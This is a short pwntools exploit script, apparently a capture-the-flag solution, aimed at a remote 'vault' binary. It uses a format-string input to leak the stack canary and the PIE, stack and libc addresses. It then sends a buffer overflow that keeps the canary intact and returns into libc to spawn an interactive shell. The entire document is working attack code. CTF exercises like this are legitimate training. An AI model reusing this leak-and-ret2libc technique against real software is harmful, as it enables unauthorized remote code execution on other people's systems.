from pwn import *

elf = context.binary = ELF('./vault')

io = remote('play.scriptsorcerers.xyz', 10292)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'vault? ', b'%23$p-%25$p-%26$p-%27$p-%31$p')

io.sendlineafter(b'> ', b'2')
io.recvuntil(b'ur stuff: ')

canary = int(io.recvuntil(b'-', drop=True), 16)
pie_leak = int(io.recvuntil(b'-', drop=True), 16)
ebp_leak = int(io.recvuntil(b'-', drop=True), 16)
other_leak = int(io.recvuntil(b'-', drop=True), 16)
libc_leak = int(io.recvline(), 16)
elf.address = pie_leak - 0x3ff4
info(f'{hex(canary)=}')
info(f'{hex(pie_leak)=}')
info(f'{hex(elf.address)=}')
info(f'{hex(libc_leak)=}')

libc_address = libc_leak - 0x022535
hex(libc_address)

payload = b'A' * 0x40 + p32(canary) + b'bbbb' + p32(pie_leak) + p32(ebp_leak)
payload += p64(libc_address + 0x051f50)
payload += p64(libc_address + 0x1cce52)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'vault? ', payload)

io.sendlineafter(b'> ', b'3')

io.clean()
io.interactive()